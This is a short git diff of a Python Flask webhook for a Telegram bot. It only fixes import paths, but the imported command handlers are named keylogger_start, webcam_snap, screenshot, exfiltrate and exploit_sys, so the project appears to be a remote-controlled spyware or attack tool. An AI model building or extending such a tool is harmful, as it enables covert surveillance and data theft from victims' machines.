@@ -1,12 +1,15 @@
-# telegram/webhook.py
-
 import os
 import json
 from flask import Blueprint, request, abort
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler
-from modules.utils import get_api_keys
-from modules.telegram_bot import menu, osint, scan, exploit_sys, screenshot, keylogger_start, webcam_snap, exfiltrate, exfiltrate_path, rapport
+from telegram_bot.utils import get_api_keys  # ✅ Corrigé
+from telegram_bot.telegram_bot import (       # ✅ Corrigé
+    menu, osint, scan, exploit_sys,
+    screenshot, keylogger_start,
+    webcam_snap, exfiltrate, exfiltrate_path,
+    rapport
+)
 
 # 🔐 Chargement des clés API
 api = get_api_keys()
